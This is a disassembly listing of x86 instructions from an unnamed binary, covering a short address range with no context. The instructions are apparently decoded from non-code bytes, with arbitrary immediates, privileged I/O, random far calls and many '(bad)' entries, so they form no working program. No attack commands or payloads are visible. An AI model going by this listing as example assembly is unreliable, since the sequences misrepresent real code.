  4b5e8e:	xchg   esi,eax
  4b5e8f:	cdq    
  4b5e90:	inc    ebp
  4b5e91:	lock jp 0x4b5e23
  4b5e94:	ja     0x4b5e19
  4b5e96:	cmp    eax,0x2ca83f32
  4b5e9b:	and    al,0x18
  4b5e9d:	mov    ebp,0x2d60c4c8
  4b5ea2:	add    DWORD PTR [eax+0x10],eax
  4b5ea5:	sbb    BYTE PTR [eax],bh
  4b5ea7:	add    DWORD PTR [ebx+0x7b126e2d],eax
  4b5ead:	fs jecxz 0x4b5f1c
  4b5eb0:	jbe    0x4b5ebd
  4b5eb2:	adc    al,0x95
  4b5eb4:	dec    ebp
  4b5eb5:	dec    eax
  4b5eb6:	dec    esp
  4b5eb7:	mov    ebp,0x7c461e
  4b5ebc:	pusha  
  4b5ebd:	stos   BYTE PTR es:[edi],al
  4b5ebe:	shl    DWORD PTR [edx],cl
  4b5ec0:	cmp    eax,0x4d2122cc
  4b5ec5:	xchg   DWORD PTR [edx+eax*4-0x28],esp
  4b5ec9:	inc    ebx
  4b5eca:	outs   dx,DWORD PTR ds:[esi]
  4b5ecb:	jae    0x4b5f1e
  4b5ecd:	or     dl,dl
  4b5ecf:	dec    edi
  4b5ed0:	scas   al,BYTE PTR es:[edi]
  4b5ed1:	sbb    edx,ebx
  4b5ed3:	adc    DWORD PTR [ecx+eax*1-0x17],0xffffffe6
  4b5ed8:	pop    edx
  4b5ed9:	add    al,0x1f
  4b5edb:	pusha  
  4b5edc:	jo     0x4b5ea7
  4b5ede:	out    0x4e,al
  4b5ee0:	pop    ecx
  4b5ee1:	or     BYTE PTR [esp+eiz*4-0x57],bl
  4b5ee5:	and    eax,eax
  4b5ee7:	add    eax,0x4644d088
  4b5eec:	rcl    BYTE PTR [ebx],0x78
  4b5eef:	push   es
  4b5ef0:	push   ss
  4b5ef1:	mov    al,ds:0x6478d77c
  4b5ef6:	dec    eax
  4b5ef7:	inc    ebx
  4b5ef8:	or     DWORD PTR [edx],ecx
  4b5efa:	es add ecx,edi
  4b5efd:	adc    dh,dl
  4b5eff:	jns    0x4b5f5b
  4b5f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b5f02:	sbb    eax,0x7bc80e2a
  4b5f07:	sub    DWORD PTR [eax-0x32da6100],0x34
  4b5f0e:	test   al,0x93
  4b5f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b5f11:	ror    BYTE PTR [esp+edx*2+0x52],cl
  4b5f15:	mov    ch,0xa0
  4b5f17:	cs xchg edi,eax
  4b5f19:	adc    DWORD PTR [edi-0x182148e],0x1
  4b5f20:	sub    al,BYTE PTR [esi*4+0x114a64b1]
  4b5f27:	js     0x4b5f1c
  4b5f29:	pushf  
  4b5f2a:	inc    ecx
  4b5f2b:	add    DWORD PTR [edx-0xfdccff9],ecx
  4b5f31:	(bad)  
  4b5f32:	mov    dl,0x53
  4b5f34:	enter  0x5746,0x56
  4b5f38:	dec    edi
  4b5f39:	mov    esp,0xe14a953b
  4b5f3e:	popa   
  4b5f3f:	add    DWORD PTR [eax-0x1cbac7ee],esp
  4b5f45:	rol    DWORD PTR [ecx+0x77003b8c],1
  4b5f4b:	xchg   BYTE PTR [esi+0x36914180],al
  4b5f51:	mov    al,0x78
  4b5f53:	xor    al,0x70
  4b5f55:	pushf  
  4b5f56:	xchg   esi,esi
  4b5f58:	daa    
  4b5f59:	hlt    
  4b5f5a:	adc    eax,0x966c9e70
  4b5f5f:	sub    BYTE PTR [edi+0x52],dl
  4b5f62:	push   cs
  4b5f63:	and    DWORD PTR [eax],esi
  4b5f65:	xchg   esi,eax
  4b5f66:	lea    esi,[esi+ecx*2+0x8]
  4b5f6a:	xchg   esi,eax
  4b5f6b:	xor    al,0xf4
  4b5f6d:	push   ebp
  4b5f6e:	mov    bh,0x53
  4b5f70:	cmp    BYTE PTR [ebx],ah
  4b5f72:	dec    esp
  4b5f73:	fnstenv [ebx]
  4b5f75:	jo     0x4b5f02
  4b5f77:	retf   
  4b5f78:	jb     0x4b5f40
  4b5f7a:	xchg   esp,eax
  4b5f7b:	(bad)  
  4b5f7c:	jae    0x4b5fea
  4b5f7e:	mov    bl,0x12
  4b5f80:	stc    
  4b5f81:	push   esi
  4b5f82:	sub    ecx,esi
  4b5f84:	or     al,0x19
  4b5f86:	sub    BYTE PTR [esi+ecx*4-0x11],ch
  4b5f8a:	xor    eax,0x17a43959
  4b5f8f:	jo     0x4b5fcd
  4b5f91:	dec    edx
  4b5f92:	fld    QWORD PTR [ecx+0x61]
  4b5f95:	pop    ebx
  4b5f96:	add    edi,DWORD PTR [edx-0x488060c1]
  4b5f9c:	les    edi,FWORD PTR [edi-0x75e6aeb7]
  4b5fa2:	pop    esp
  4b5fa3:	and    al,0x13
  4b5fa5:	jmp    0x4b5fd5
  4b5fa7:	adc    al,BYTE PTR [edx+0x1a]
  4b5faa:	add    bl,al
  4b5fac:	adc    eax,0xd072a132
  4b5fb1:	or     dl,BYTE PTR [edx]
  4b5fb3:	push   edx
  4b5fb4:	ins    BYTE PTR es:[edi],dx
  4b5fb5:	sbb    al,0xd0
  4b5fb7:	mov    cl,0x43
  4b5fb9:	or     dl,BYTE PTR [ecx]
  4b5fbb:	dec    ebp
  4b5fbc:	sub    esp,esp
  4b5fbe:	and    bl,BYTE PTR [ebp+0x5d821da1]
  4b5fc4:	xor    al,0x6
  4b5fc6:	inc    edx
  4b5fc7:	adc    eax,DWORD PTR ds:0x9bc04af3
  4b5fcd:	push   0xeb015228
  4b5fd2:	arpl   WORD PTR [ecx+0x3a],dx
  4b5fd5:	in     eax,0xc6
  4b5fd7:	jb     0x4b6042
  4b5fd9:	sub    bl,BYTE PTR [ebx]
  4b5fdb:	mov    bl,0xaf
  4b5fdd:	and    DWORD PTR [ecx],ebp
  4b5fdf:	int3   
  4b5fe0:	or     cl,BYTE PTR gs:[edx+eax*8-0x3b]
  4b5fe5:	mov    ch,0x95
  4b5fe7:	or     cl,BYTE PTR [ebp+0x59]
  4b5fea:	xchg   ecx,eax
  4b5feb:	and    DWORD PTR [edi-0x2da66bf5],edx
  4b5ff1:	push   cs
  4b5ff2:	(bad)  
  4b5ff3:	or     al,0x6e
  4b5ff5:	loop   0x4b5fe0
  4b5ff7:	xchg   ch,cl
  4b5ff9:	xor    BYTE PTR [ecx-0x1d],ah
  4b5ffc:	or     eax,0x33ebc5a0
  4b6001:	js     0x4b5fbf
  4b6003:	daa    
  4b6004:	or     eax,esp
  4b6006:	pop    es
  4b6007:	js     0x4b602b
  4b6009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b600a:	inc    eax
  4b600b:	mov    edi,0x3dce2801
  4b6010:	add    ecx,0x4b536346
  4b6016:	inc    edx
  4b6017:	rol    DWORD PTR [eax+0x3f],0x85
  4b601b:	xlat   BYTE PTR ds:[ebx]
  4b601c:	retf   
  4b601d:	mov    esp,DWORD PTR [edx]
  4b601f:	xchg   edx,eax
  4b6020:	xor    al,ch
  4b6022:	nop
  4b6023:	push   eax
  4b6024:	outs   dx,BYTE PTR ds:[esi]
  4b6025:	outs   dx,DWORD PTR ds:[esi]
  4b6026:	mov    ah,0x77
  4b6028:	xor    BYTE PTR [edi-0x29],al
  4b602b:	call   0xa3c9:0x853830db
  4b6032:	adc    DWORD PTR [ebp+0x36],0xf
  4b6036:	dec    esi
  4b6037:	(bad)  [eax-0x23]
  4b603a:	frstor [eax]
  4b603c:	inc    edx
  4b603d:	xchg   edi,eax
  4b603e:	sub    BYTE PTR [edi-0x6eade123],al
  4b6044:	jbe    0x4b5fc9
  4b6046:	or     BYTE PTR [ecx-0x39ec7229],ah
  4b604c:	loop   0x4b6000
  4b604e:	mov    bl,0xbf
  4b6050:	xor    eax,0x52477a92
  4b6055:	and    BYTE PTR [ecx+edi*1-0x12cde961],0x8
  4b605d:	add    eax,0x6060031
  4b6062:	fild   WORD PTR [esi]
  4b6064:	jne    0x4b60a4
  4b6066:	enter  0xe02,0x5c
  4b606a:	aaa    
  4b606b:	adc    edx,DWORD PTR [edx-0x15]
  4b606e:	mov    dl,0xd1
  4b6070:	leave  
  4b6071:	inc    ebx
  4b6072:	cmp    ebx,DWORD PTR [edi]
  4b6074:	out    dx,eax
  4b6075:	rol    ah,0xb
  4b6078:	add    ebp,edi
  4b607a:	xor    cl,dl
  4b607c:	gs pusha 
  4b607e:	mov    al,ds:0x434d046f
  4b6083:	js     0x4b60b9
  4b6085:	mov    al,ds:0x841c587d
  4b608a:	or     edi,DWORD PTR [ebp+0x50]
  4b608d:	dec    ebp
  4b608e:	pop    es
  4b608f:	add    ch,BYTE PTR [esi-0x7dd81893]
  4b6095:	sub    BYTE PTR ds:0x1d7df4ba,0x5b
  4b609c:	call   ebx
  4b609e:	icebp  
  4b609f:	sbb    al,0xa4
  4b60a1:	mov    ebx,0x52115223
  4b60a6:	sub    BYTE PTR [ebx+0x2d38c12],ah
  4b60ac:	(bad)  
  4b60ae:	add    DWORD PTR [esi-0x40cc7f7f],0x5d
  4b60b5:	pusha  
  4b60b6:	sub    BYTE PTR [ebx+edi*1-0x32],dl
  4b60ba:	jmp    FWORD PTR [eax-0x77]
  4b60bd:	ror    BYTE PTR [edx],cl
  4b60bf:	xchg   ebx,eax
  4b60c0:	add    DWORD PTR ds:0x50610761,esi
  4b60c6:	sbb    edi,0x3c1c0c68
  4b60cc:	add    DWORD PTR [eax+0x36],esi
  4b60cf:	mov    edi,0x7271a26d
  4b60d4:	cmp    ah,ah
  4b60d6:	retf   
  4b60d7:	sahf   
  4b60d8:	mov    edx,0xaff4c0e8
  4b60dd:	js     0x4b60cc
  4b60df:	sub    esi,DWORD PTR [esi+eax*4]
  4b60e2:	shr    BYTE PTR [ebx+0x1b],0x2d
  4b60e6:	sub    al,0x3e
  4b60e8:	xlat   BYTE PTR ds:[ebx]
  4b60e9:	add    al,0x4e
  4b60eb:	add    esi,DWORD PTR [esi+0x34]
  4b60ee:	fucom  st(0)
  4b60f0:	dec    ebp
  4b60f1:	lods   eax,DWORD PTR ds:[esi]
  4b60f2:	mov    edx,0x77d313d0
  4b60f7:	xchg   edx,eax
  4b60f8:	rcl    DWORD PTR [edx+0x50],1
  4b60fb:	and    DWORD PTR [ebx+0x59a38c29],edx
  4b6101:	ret    
  4b6102:	inc    eax
  4b6103:	jo     0x4b610b
  4b6105:	dec    esp
  4b6106:	out    0xbb,eax
  4b6108:	xchg   BYTE PTR [edi],dl
  4b610a:	cmc    
  4b610b:	add    eax,0x8581d690
  4b6110:	dec    ebx
  4b6111:	jecxz  0x4b611e
  4b6113:	out    0xd6,eax
  4b6115:	mov    WORD PTR [ebx],ds
  4b6117:	ja     0x4b60cd
  4b6119:	cmp    al,0x11
  4b611b:	ins    BYTE PTR es:[edi],dx
  4b611c:	push   0x6e93c0cf
  4b6121:	xor    BYTE PTR [ecx],bh
  4b6123:	pop    ss
  4b6124:	push   eax
  4b6125:	rol    bh,cl
  4b6127:	xchg   ecx,eax
  4b6128:	sbb    ecx,DWORD PTR ds:0x3503f528
  4b612e:	fs pop es
  4b6130:	or     al,0xf1
  4b6132:	push   ebx
  4b6133:	test   eax,0x3b486df
  4b6138:	sub    BYTE PTR [edx+ecx*4-0x4bf7ecbf],0x2b
  4b6140:	xor    eax,DWORD PTR [edx]
  4b6142:	mov    esp,DWORD PTR [esi]
  4b6144:	(bad)  
  4b6145:	into   
  4b6146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b6147:	imul   edi,DWORD PTR [ecx-0x10],0xe86bc67d
  4b614e:	sbb    eax,0x15bfeb4f
  4b6153:	jmp    FWORD PTR [edx]
  4b6155:	fisubr DWORD PTR [edx-0x3a]
  4b6158:	jg     0x4b6162
  4b615a:	push   edx
  4b615b:	mov    bl,0x21
  4b615d:	call   0x74fd7567
  4b6162:	adc    cl,bl
  4b6164:	push   es
  4b6165:	xchg   esp,eax
  4b6166:	mov    DWORD PTR [ecx+0x51],edx
  4b6169:	adc    DWORD PTR [edx-0x66e01000],0x47
  4b6170:	shl    BYTE PTR [esi+0x53],0x78
  4b6174:	sub    edi,ebx
  4b6176:	clc    
  4b6177:	xor    DWORD PTR [esi+0x8],ebp
  4b617a:	jecxz  0x4b6178
  4b617c:	add    eax,0x8c0e2534
  4b6181:	xchg   DWORD PTR [ebp-0x1d],ebp
  4b6184:	sbb    cl,BYTE PTR [eax]
  4b6186:	push   esi
  4b6187:	lods   al,BYTE PTR ds:[esi]
  4b6188:	test   DWORD PTR [ebp+0x1448d580],ebp
  4b618e:	fwait
  4b618f:	jnp    0x4b61eb
  4b6191:	dec    edx
  4b6192:	ror    DWORD PTR [esi],cl
  4b6194:	sbb    BYTE PTR [eax],bl
  4b6196:	lahf   
  4b6197:	inc    eax
  4b6198:	sbb    al,0x72
  4b619a:	mov    DWORD PTR [edx+0xb],ebx
  4b619d:	shl    BYTE PTR [esi-0x2561f9b3],0x5c
  4b61a4:	dec    edi
  4b61a5:	lahf   
  4b61a6:	mov    esi,0xd5686fa1
  4b61ab:	mov    ebx,0x86e420e8
  4b61b0:	loope  0x4b61a2
  4b61b2:	add    eax,0xa96eb513
  4b61b7:	call   DWORD PTR [edi]
  4b61b9:	xor    eax,0xf96aa751
  4b61be:	add    DWORD PTR [esi],eax
  4b61c0:	add    DWORD PTR [eax-0x750c9558],ebx
  4b61c6:	cmp    eax,0xfc0c0c71
  4b61cb:	(bad)  
  4b61cc:	mov    edx,0x686524e8
  4b61d1:	jecxz  0x4b61b9
  4b61d3:	add    esp,eax
  4b61d5:	je     0x4b617b
  4b61d7:	jle    0x4b624f
  4b61d9:	xchg   ebp,eax
  4b61da:	sub    ecx,DWORD PTR [ebx+0x25f027e3]
  4b61e0:	sbb    BYTE PTR [edx-0x2d22077c],ah
  4b61e6:	cmp    DWORD PTR [eax],edi
  4b61e8:	cwde   
  4b61e9:	sub    ebp,edi
  4b61eb:	imul   BYTE PTR [eax-0x18]
  4b61ee:	mov    dl,0x2b
  4b61f0:	and    al,0x12
  4b61f2:	push   ss
  4b61f3:	add    BYTE PTR [edx+0x2148d333],dh
  4b61f9:	sub    DWORD PTR [ebx+eiz*8],esp
  4b61fc:	inc    ebx
  4b61fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b61fe:	mov    cl,0x34
  4b6200:	mov    dh,0xed
  4b6202:	jmp    0x4b61e4
  4b6204:	mov    al,ds:0x45592441
  4b6209:	mov    WORD PTR [ebx+0x30],?
  4b620c:	ins    BYTE PTR es:[edi],dx
  4b620d:	iret   
  4b620e:	jnp    0x4b6274
  4b6210:	or     dh,BYTE PTR [edi-0x17]
  4b6213:	mov    esi,0x43e25fa8
  4b6218:	add    cl,BYTE PTR [ecx]
  4b621a:	add    BYTE PTR [ecx+ebp*2-0x59],0x2a
  4b621f:	lock add BYTE PTR [esi],bl
  4b6222:	inc    esi
  4b6223:	and    ecx,DWORD PTR [ebx-0x4407440f]
  4b6229:	add    al,0xa5
  4b622b:	mov    dl,0x5d
  4b622d:	lea    edx,[ebx-0x70]
  4b6230:	pop    esi
  4b6231:	jnp    0x4b624c
  4b6233:	add    al,0x38
  4b6235:	sbb    eax,0xb06021e0
  4b623a:	stos   DWORD PTR es:[edi],eax
  4b623b:	mov    DWORD PTR [edx+eax*2+0x21],ebx
  4b623f:	mov    ds:0x26f879b0,al
  4b6244:	sub    BYTE PTR [edx+0x6],ch
  4b6247:	adc    BYTE PTR [edx],al
  4b6249:	les    esp,FWORD PTR [edi]
  4b624b:	adc    al,0x5c
  4b624d:	xor    al,0xae
  4b624f:	(bad)  ds:0xb8db0231
  4b6255:	mov    ds:0xc2571013,al
  4b625a:	fcom   DWORD PTR [ebx]
  4b625c:	outs   dx,BYTE PTR ds:[esi]
  4b625d:	mov    eax,0x8d1ec672
  4b6262:	clc    
  4b6263:	mov    esp,0x8dc58acd
  4b6268:	inc    eax
  4b6269:	mov    esp,0x1c4b0eb
  4b626e:	test   eax,0x27b0405f
  4b6273:	fwait
  4b6274:	push   esi
  4b6275:	ror    DWORD PTR [edx-0x23e6ece7],0xc2
  4b627c:	dec    esi
  4b627d:	fmul   DWORD PTR [ebx-0xad4bc4f]
  4b6283:	add    al,0xc3
  4b6285:	sub    BYTE PTR [edx],ah
  4b6287:	rcl    DWORD PTR [edi-0x1f],0x8a
  4b628b:	xchg   ecx,eax
  4b628c:	mov    BYTE PTR [ebp+0x34],0x13
  4b6290:	leave  
  4b6291:	add    al,0x47
  4b6293:	mov    al,0xdf
  4b6295:	ror    BYTE PTR [ecx+0x23561a1b],0x8d
  4b629c:	rcl    DWORD PTR [ebx],cl
  4b629e:	xchg   DWORD PTR [ebx+0x31],edi
  4b62a1:	push   cs
  4b62a2:	xchg   edi,eax
  4b62a3:	retf   
  4b62a4:	sbb    al,0x2
  4b62a6:	ror    DWORD PTR gs:[ebx-0x68],1
  4b62aa:	add    al,0x29
  4b62ad:	sub    BYTE PTR [esi-0x352d6668],bl
  4b62b3:	xchg   ebp,eax
  4b62b4:	adc    al,0x70
  4b62b6:	and    eax,0xfd341d81
  4b62bb:	mov    ?,WORD PTR [ebx]
  4b62bd:	pop    ds
  4b62be:	rol    BYTE PTR [eax-0x5fc32b1a],0xf
  4b62c5:	out    dx,eax
  4b62c6:	sbb    BYTE PTR [ecx+0x0],ch
  4b62c9:	jecxz  0x4b6283
  4b62cb:	in     eax,dx
  4b62cc:	inc    ebx
  4b62cd:	cmp    eax,esi
  4b62cf:	les    ecx,FWORD PTR [ecx]
  4b62d1:	xchg   DWORD PTR [edx+0x7ccad821],ebp
  4b62d7:	xor    BYTE PTR [eax-0x79],0x6d
  4b62db:	jle    0x4b62dc
  4b62dd:	add    al,0x58
  4b62df:	fsub   DWORD PTR [ecx-0x63]
  4b62e2:	cmp    al,0x25
  4b62e4:	adc    al,BYTE PTR [edi]
  4b62e6:	inc    esi
  4b62e7:	pop    es
  4b62e8:	in     al,0x68
  4b62ea:	das    
  4b62eb:	cmp    cl,bl
  4b62ed:	jo     0x4b6305
  4b62ef:	push   ebp
  4b62f0:	xor    DWORD PTR [esi],edx
  4b62f2:	lock mov esi,0x5813d50d
  4b62f8:	mov    bh,0x81
  4b62fa:	aaa    
  4b62fb:	jl     0x4b6310
  4b62fd:	gs inc ecx
  4b62ff:	sub    BYTE PTR [edx],bl
  4b6301:	(bad)  
  4b6302:	jge    0x4b6355
  4b6304:	pop    edi
  4b6305:	lods   al,BYTE PTR ds:[esi]
  4b6306:	sbb    eax,0x1d1574e0
  4b630b:	lahf   
  4b630c:	pop    esi
  4b630d:	inc    edi
  4b630e:	scas   eax,DWORD PTR es:[edi]
  4b630f:	lea    esi,[eax]
  4b6311:	fidivr WORD PTR [eax]
  4b6313:	or     al,BYTE PTR [eax+0x6a]
  4b6316:	sbb    eax,esp
  4b6318:	rcr    ah,0x4d
  4b631b:	add    ch,dh
  4b631d:	cmp    bl,BYTE PTR [ebp+0x56d321d6]
  4b6323:	mov    ds:0xe014440b,eax
  4b6328:	js     0x4b62ea
  4b632a:	pop    esp
  4b632b:	loopne 0x4b633f
  4b632d:	push   esp
  4b632e:	call   0x1605:0x382d3f85
  4b6335:	gs mov esi,0x2dd39e0
  4b633b:	dec    edx
  4b633c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b633d:	and    al,BYTE PTR [esi-0x42]
  4b6340:	into   
  4b6341:	and    ebp,DWORD PTR [ebx*8-0x53d49c7e]
  4b6348:	add    DWORD PTR [ebx+0x4],ebp
  4b634b:	and    bh,bh
  4b634d:	rcr    BYTE PTR [edx+0x2833e22f],1
  4b6353:	sti    
  4b6354:	xchg   ebx,eax
  4b6355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b6356:	inc    ebx
  4b6357:	inc    esp
  4b6358:	pop    eax
  4b6359:	mov    edi,0x6a5c5824
  4b635e:	stos   BYTE PTR es:[edi],al
  4b635f:	pop    ecx
  4b6360:	push   0x20
  4b6362:	push   ss
  4b6363:	shl    BYTE PTR [eax+0x44b0240],0xb2
  4b636a:	lock jne 0x4b639d
  4b636d:	mov    esp,0x34608d2f
  4b6372:	cwde   
  4b6373:	outs   dx,BYTE PTR ds:[esi]
  4b6374:	test   DWORD PTR [eax+0x53],ebp
  4b6377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b6378:	out    dx,al
  4b6379:	shr    edx,0xa9
  4b637c:	clc    
  4b637d:	les    eax,FWORD PTR [ebp+0x1f]
  4b6380:	fmul   st,st(1)
  4b6382:	js     0x4b636d
  4b6384:	imul   edx,DWORD PTR [edx-0x46bf95f0],0x12
  4b638b:	mov    eax,ds:0x8ad382fd
  4b6390:	and    eax,0xbc523c38
  4b6395:	push   esi
  4b6396:	add    BYTE PTR [esi-0x2c],0x4b
  4b639a:	push   ebx
  4b639b:	push   0x94b7d236
  4b63a0:	inc    ebx
  4b63a1:	adc    edi,DWORD PTR [edx+0x28]
  4b63a4:	inc    esi
  4b63a5:	push   eax
  4b63a6:	fcomp  QWORD PTR [ebx-0x14afc78f]
  4b63ac:	into   
  4b63ad:	adc    al,0x92
  4b63af:	mov    bh,BYTE PTR [edx-0x10]
  4b63b2:	dec    edi
  4b63b3:	cmp    eax,0x78da5a6c
  4b63b8:	mov    al,0x9b
  4b63ba:	mov    ds:0x31314503,eax
  4b63bf:	or     eax,0x31cf254
  4b63c4:	push   esi
  4b63c5:	xor    eax,DWORD PTR [eiz*1-0x4a4c3cec]
  4b63cc:	lock lahf 
  4b63ce:	mov    BYTE PTR [edi+0x29],0x8b
  4b63d2:	mov    esp,0xc7299d24
  4b63d7:	mov    eax,gs:0xbf43adf3
  4b63dd:	xchg   ebp,eax
  4b63de:	push   ds
  4b63df:	inc    esi
  4b63e0:	fs inc edx
  4b63e2:	xor    DWORD PTR [eax-0x77],ecx
  4b63e5:	cmp    ebp,ebx
  4b63e7:	inc    esp
  4b63e8:	add    eax,0xd12893d6
  4b63ed:	push   es
  4b63ee:	aad    0xb6
  4b63f0:	cli    
  4b63f1:	sub    cl,BYTE PTR [edi]
  4b63f3:	jo     0x4b638a
  4b63f5:	push   ebp
  4b63f6:	mov    ds:0xcdd57ed,al
  4b63fb:	sbb    DWORD PTR [edx],ebx
  4b63fd:	mov    al,dl
  4b63ff:	add    DWORD PTR ds:0xbf149ecd,0x7061708b
  4b6409:	jmp    0x4b6414
  4b640b:	out    dx,eax
  4b640c:	mov    ch,0x49
  4b640e:	shl    BYTE PTR [eax+0x4],cl
  4b6411:	or     esp,DWORD PTR [edi]
  4b6413:	cmp    dl,BYTE PTR [eax+0x1b]
  4b6416:	cmp    DWORD PTR [eax],eax
  4b6418:	push   0x8631f217
  4b641d:	or     edx,edi
  4b641f:	xor    eax,0xb8e81886
  4b6424:	mov    BYTE PTR [eax+esi*1],bl
  4b6427:	sub    eax,0x42d22e9b
  4b642c:	inc    edi
  4b642d:	ins    DWORD PTR es:[edi],dx
  4b642e:	sub    DWORD PTR [ebp-0x22ee2ff8],0x6f
  4b6435:	xor    BYTE PTR [ebx],dh
  4b6437:	and    al,0x79
  4b6439:	faddp  st(1),st
  4b643b:	mov    eax,ds:0x841e9051
  4b6440:	and    al,0x6
  4b6442:	das    
  4b6443:	cmp    ah,BYTE PTR [edi+ebx*4]
  4b6446:	and    al,0xdc
  4b6448:	add    DWORD PTR [eax+0xb2a1c01],edi
  4b644e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b644f:	call   0x4064d991
  4b6454:	cdq    
  4b6455:	sub    BYTE PTR [ecx*2+0x4742909],ch
  4b645c:	loop   0x4b644e
  4b645e:	pop    es
  4b645f:	xor    eax,0x50d910b
  4b6464:	jbe    0x4b6471
  4b6466:	in     eax,0x69
  4b6468:	pushf  
  4b6469:	xor    eax,0x12c2e14d
  4b646e:	(bad)
  4b6472:	sbb    dh,BYTE PTR [esi-0x6a]
  4b6475:	aaa    
  4b6476:	xchg   ebp,eax
  4b6477:	push   0x35
  4b6479:	pop    es
  4b647a:	xchg   edi,eax
  4b647b:	xchg   edx,eax
  4b647c:	adc    BYTE PTR es:[edi+0x2c],cl
  4b6480:	sub    al,0x5d
  4b6482:	add    edi,0x1b611b88
  4b6488:	pushf  
  4b6489:	jmp    FWORD PTR [edi]
  4b648b:	pusha  
  4b648c:	hlt    
  4b648d:	cdq    
  4b648e:	mov    esi,0x85989941
  4b6493:	inc    edi
  4b6494:	mul    BYTE PTR [edx+0x19580c63]
  4b649a:	add    ah,BYTE PTR [eax+eiz*8]
  4b649d:	mov    BYTE PTR [edi+edx*4-0x4e3d2d3a],0xf4
  4b64a5:	sub    ebp,DWORD PTR ds:0x9f552768
  4b64ab:	shr    DWORD PTR [ecx-0x7992e6fe],cl
  4b64b1:	sub    BYTE PTR [ecx-0x25],al
  4b64b4:	test   BYTE PTR [eax-0x52],bl
  4b64b7:	mov    esi,0x3c23800b
  4b64bc:	or     ebp,DWORD PTR [ebx-0x448b2897]
  4b64c2:	add    BYTE PTR [esi-0x7e],al
  4b64c5:	xor    DWORD PTR ds:0x18e20f1f,edi
  4b64cb:	dec    esp
  4b64cc:	mov    bh,0x88
  4b64ce:	das    
  4b64cf:	ret    
  4b64d0:	sbb    DWORD PTR [edx+ecx*2+0x11671b18],ecx
  4b64d7:	scas   eax,DWORD PTR es:[edi]
  4b64d8:	push   ebx
  4b64d9:	dec    eax
  4b64da:	inc    ecx
  4b64db:	sbb    BYTE PTR [eax],ah
  4b64dd:	test   eax,0x52e5f968
  4b64e2:	and    BYTE PTR [edi],dl
  4b64e4:	push   edi
  4b64e5:	xchg   ecx,eax
  4b64e6:	push   edx
  4b64e7:	adc    BYTE PTR [ecx],bl
  4b64e9:	sub    BYTE PTR ds:0x6d9f92e4,bh
  4b64ef:	mov    ds:0x13d8c24b,eax
  4b64f4:	or     DWORD PTR [edx],eax
  4b64f6:	adc    cl,BYTE PTR ds:0x10f1f0b5
  4b64fc:	test   al,0xad
  4b64fe:	and    DWORD PTR [eax],0xffffff9f
  4b6501:	xchg   esi,eax
  4b6502:	cdq    
  4b6503:	aad    0xd6
  4b6505:	and    eax,0xcb0c2ccd
  4b650a:	imul   DWORD PTR [edx]
  4b650c:	fisubr DWORD PTR [ecx-0x1d]
  4b650f:	sahf   
  4b6510:	lods   al,BYTE PTR ds:[esi]
  4b6511:	mov    ecx,0x32d8d849
  4b6516:	loop   0x4b6519
  4b6518:	cmc    
  4b6519:	inc    ebp
  4b651a:	rcl    DWORD PTR ds:0xb4173574,0x33
  4b6521:	dec    edx
  4b6522:	sbb    DWORD PTR [edx+0x4b],eax
  4b6525:	lea    esi,[ebx+0x14]
  4b6528:	add    ah,BYTE PTR [edx+0x1]
  4b652b:	aaa    
  4b652c:	mov    ?,WORD PTR [edi-0x73]
  4b652f:	jp     0x4b650f
  4b6531:	pop    ebx
  4b6532:	jl     0x4b64b4
  4b6534:	push   esp
  4b6535:	faddp  st(2),st
  4b6537:	lea    esi,[edi+0x109f410c]
  4b653d:	jl     0x4b64c5
  4b653f:	mov    al,ds:0xa824b42b
  4b6544:	xor    esi,DWORD PTR [esi+ebp*2-0x41229b71]
  4b654b:	sub    BYTE PTR [edi+0x4648aec8],0x97
  4b6552:	std    
  4b6553:	add    BYTE PTR [esi],bh
  4b6555:	pop    es
  4b6556:	mov    eax,ds:0x4e480054
  4b655b:	lods   al,BYTE PTR ds:[esi]
  4b655c:	add    bh,dh
  4b655e:	scas   al,BYTE PTR es:[edi]
  4b655f:	sbb    edi,ecx
  4b6561:	pop    ebp
  4b6562:	mov    eax,0xaa873dcc
  4b6567:	push   esp
  4b6568:	(bad)  
  4b6569:	test   eax,0xcb1a581f
  4b656e:	adc    al,0x6e
  4b6570:	adc    bh,BYTE PTR [eax-0x47c4210e]
  4b6576:	cmp    al,0x8a
  4b6578:	sub    BYTE PTR [eax+0x7a],al
  4b657b:	push   esp
  4b657c:	push   cs
  4b657d:	jo     0x4b6501
  4b657f:	shr    ah,0x33
  4b6582:	sbb    edi,DWORD PTR [ecx-0x272fdb74]
  4b6588:	sbb    ebp,eax
  4b658a:	mov    edx,0xd8d45884
  4b658f:	mov    ch,0xd3
  4b6591:	clc    
  4b6592:	fadd   QWORD PTR [eax-0x6e7072fc]
  4b6598:	dec    ebx
  4b6599:	int    0x2
  4b659b:	outs   dx,BYTE PTR ds:[esi]
  4b659c:	imul   eax
  4b659e:	lods   eax,DWORD PTR ds:[esi]
  4b659f:	dec    eax
  4b65a0:	cmove  ebx,DWORD PTR [eax]
  4b65a3:	inc    eax
  4b65a4:	sub    esi,DWORD PTR [eax]
  4b65a6:	cs mov edi,0x581744d9
  4b65ac:	ds pop esp
  4b65ae:	push   0x473b60ae
  4b65b3:	mov    esi,0x64d23eb7
  4b65b8:	es push 0x1e346c8c
  4b65be:	dec    eax
  4b65bf:	cmp    DWORD PTR [edx-0x1c],esi
  4b65c2:	je     0x4b656c
  4b65c4:	js     0x4b660a
  4b65c6:	jl     0x4b659c
  4b65c8:	jnp    0x4b6630
  4b65ca:	(bad)  
  4b65cb:	dec    esp
  4b65cc:	xlat   BYTE PTR ds:[ebx]
  4b65cd:	loopne 0x4b65e4
  4b65cf:	test   BYTE PTR [eax+0x3a],al
  4b65d2:	iret   
  4b65d3:	sbb    esi,DWORD PTR [edx+edi*4+0x14]
  4b65d7:	dec    ebx
  4b65d8:	add    BYTE PTR [eax],dl
  4b65da:	adc    al,0x8c
  4b65dc:	adc    dh,cl
  4b65de:	rcl    DWORD PTR [edx],cl
  4b65e0:	and    bh,BYTE PTR [ebp-0x3b]
  4b65e3:	lea    edi,[edi+ebp*8]
  4b65e6:	push   ebx
